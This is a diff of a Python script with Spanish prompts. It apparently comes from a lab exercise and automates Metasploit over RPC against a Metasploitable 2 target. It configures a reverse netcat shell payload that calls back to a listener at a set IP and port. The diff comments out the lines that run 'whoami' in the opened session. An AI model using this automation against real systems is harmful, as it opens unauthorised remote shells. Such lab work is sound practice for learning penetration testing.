@@ -1,12 +1,13 @@
 from pymetasploit3.msfrpc import *
 import time 
+import sys
 
 def connect(password, port=55552):
 	try:
 		client = MsfRpcClient(password, port=port)
 		return client
-	except:
-		return None
+	except Exception as e:
+		print(e)
 
 ipAddress = input("Introduce la IP de Metasploitable 2: ")
 password = input("Introduce el password del servicio MSGRPC: ")
@@ -22,7 +23,7 @@ if client is not None:
 
 	pl = client.modules.use('payload', 'cmd/unix/reverse_netcat')
 	#Cambiar LHOST por la IP correspondiente al sistema donde se está ejecutando Metasploit Framework
-	pl['LHOST'] = '192.168.1.11'
+	pl['LHOST'] = '192.168.0.45'
 	pl['LPORT'] = '4444'
 	
 
@@ -33,9 +34,9 @@ if client is not None:
 	time.sleep(5)
 	#console.run_module_with_output(exploit, payload=pl)
 	print(client.sessions.list)
-	shell = client.sessions.session('1')
-	shell.write('whoami')
-	print(shell.read())
+	#shell = client.sessions.session('1')
+	#shell.write('whoami')
+	#print(shell.read())
 
 else:
 	print("No se ha podido establecer la conexión con el servicio MSGRPC")
